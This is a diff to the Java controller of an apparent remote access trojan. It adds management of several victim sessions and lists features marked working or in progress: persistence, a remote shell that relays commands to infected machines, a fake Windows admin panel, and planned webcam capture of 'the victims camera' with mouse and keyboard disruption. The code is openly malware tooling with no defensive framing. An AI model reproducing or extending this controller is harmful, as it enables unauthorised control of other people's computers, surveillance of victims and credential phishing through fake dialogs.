@@ -1,6 +1,7 @@
 import java.net.*;
 import java.io.*;
 import cs1.*;
+import java.util.*;
 public class Server implements Runnable {
     ServerSocket ss;
     Socket s;
@@ -8,24 +9,17 @@ public class Server implements Runnable {
     DataOutputStream dout;
     PrintStream ps;
     OutputStream os;
+    ArrayList<Socket> sessions = new ArrayList<Socket>();
     public static void main(String[] args) throws Exception {
-        new Server();
+        Server serv = new Server();
+        (new Thread(new SessionListener(serv))).start();
+        serv.run();
     }
     public Server() {
-        try {
-            ss = new ServerSocket(32323);
-            run();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }       
     }
     public void run() {
         try {
-            s = ss.accept();
-            ps = new PrintStream(s.getOutputStream());
-            os = s.getOutputStream();
-            din = new BufferedReader(new InputStreamReader(s.getInputStream()));
-            System.out.println("connection from " + s.getInetAddress());
+            //System.out.println("connection from " + s.getInetAddress());
             String command;
             while(true) {
                 System.out.print("<console> : ");
@@ -33,47 +27,58 @@ public class Server implements Runnable {
                 command=command.toLowerCase().trim();
                 if (command.equals("help")) {
                     System.out.println("HELP MENU:");
-                    System.out.println("\tpersist - initiate persistance on remote machine");
-                    System.out.println("\tshell - enter a stateless shell environment");
-                    System.out.println("\tupload - open prompt for uploading a file");
-                    System.out.println("\tdownload - open prompt for downloading a remote file");
-                    System.out.println("\tscreenshot - take a screenshot of the remote machine");
-                    System.out.println("\twebcam - take an image using the victims camera");
-                    System.out.println("\tmousebreak - prevent the victims mouse from moving");
-                    System.out.println("\tkeybreak - create issues with the victims keyboard");
-                    System.out.println("\tadminpanel - creates a fake windows admin panel");
+                    System.out.println("\tWORKING - persist - initiate persistance on remote machine");
+                    System.out.println("\tWORKING - shell - enter a stateless shell environment");
+                    System.out.println("\tIN PROGRESS - upload - open prompt for uploading a file");
+                    System.out.println("\tIN PROGRESS - download - open prompt for downloading a remote file");
+                    System.out.println("\tIN PROGRESS - screenshot - take a screenshot of the remote machine");
+                    System.out.println("\tIN PROGRESS - webcam - take an image using the victims camera");
+                    System.out.println("\tIN PROGRESS - mousebreak - prevent the victims mouse from moving");
+                    System.out.println("\tIN PROGRESS - keybreak - create issues with the victims keyboard");
+                    System.out.println("\tWORKING - adminpanel - creates a fake windows admin panel");
+                    System.out.println("\tWORKING - sessions - lists sessions");
+                    System.out.println("\tWORKING - selectsession - change to a different session");
                 }
                 if (command.equals("persist")) {
-                    System.out.println("persistence module initiated");
-                    System.out.println("\nEnter 1 to create persistence, enter 2 to remove persistence");
-                    String choice = Keyboard.readString();
-                    if (choice.equals("1")) {
-                        ps.println("ps99");   
-                    } else if (choice.equals("2")) {
-                        ps.println("ps-99");
+                    try {
+                        System.out.println("persistence module initiated");
+                        System.out.println("\nEnter 1 to create persistence, enter 2 to remove persistence");
+                        String choice = Keyboard.readString();
+                        if (choice.equals("1")) {
+                            ps.println("ps99");   
+                        } else if (choice.equals("2")) {
+                            ps.println("ps-99");
+                        }
+                    } catch (Exception e) {
+                        System.out.println("failed to add persistence");
                     }
                 }
                 if (command.equals("shell")) {
                     System.out.println("shell environment initiated");
                     System.out.println("type -99 to exit environemt");
-                    ps.println("sh99");
-                    ps.println("echo %username%");
-                    String uname = din.readLine();
-                    din.readLine();
-                    while(true) {
-                        System.out.print(uname + ">");
-                        String in = Keyboard.readString();
-                        if (in.equals("-99")) {
-                            break;
+                    try {
+                        ps.println("sh99");
+                        ps.println("echo %username%");
+                        String uname = din.readLine();
+                        din.readLine();
+                        while(true) {
+                            System.out.print(uname + ">");
+                            String in = Keyboard.readString();
+                            if (in.equals("-99")) {
+                                break;
+                            }
+                            ps.println(in);
+                            String line = din.readLine();
+                            while(!line.equals("{}{}{}")) {
+                                System.out.println(line);
+                                line=din.readLine();
+                            }
                         }
-                        ps.println(in);
-                        String line = din.readLine();
-                        while(!line.equals("{}{}{}")) {
-                            System.out.println(line);
-                            line=din.readLine();
-                        }
+                        ps.println("sh-99");
+                    } catch (Exception e) {
+                        System.out.println("shell connection dropped");
+                        System.out.println("session might be offline");
                     }
-                    ps.println("sh-99");
                 }
                 if (command.equals("upload")) {
                     System.out.println("file upload initiated");
@@ -99,6 +104,10 @@ public class Server implements Runnable {
                     System.out.println("keybreak attack initiated");
                     
                 }
+                if (command.equals("nircmd")) {
+                    System.out.println("nircmd control initiated");
+                    
+                }
                 if (command.equals("adminpanel")) {
                     System.out.println("starting remote admin panel");
                     ps.println("ap99");
@@ -116,9 +125,37 @@ public class Server implements Runnable {
                     }
                     System.out.println();
                 }
+                if (command.equals("sessions")) {
+                    try {
+                        System.out.println("LISTING SESSIONS:\n");
+                        for(int i=0;i<sessions.size();i++) {
+                            System.out.println(i + " - " + sessions.get(i).getInetAddress());
+                        }
+                    } catch (Exception e) {
+                        System.out.println("failed to list sessions");
+                    }
+                }
+                if (command.equals("selectsession")) {
+                    try {
+                        System.out.println("\nenter a valid session #:");
+                        int sesnum = Keyboard.readInt();
+                        s = sessions.get(sesnum);
+                        ps = new PrintStream(s.getOutputStream());
+                        os = s.getOutputStream();
+                        din = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                        System.out.println("now connected to session " + sesnum);
+                        System.out.println("connected session IP is " + s.getInetAddress());
+                    } catch (Exception e) {
+                        System.out.println("failed to change session");
+                    }
+                }
             }
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
+    public void addSocket(Socket cs) {
+        System.out.println("connection from " + cs.getInetAddress());
+        sessions.add(cs);
     }
  }
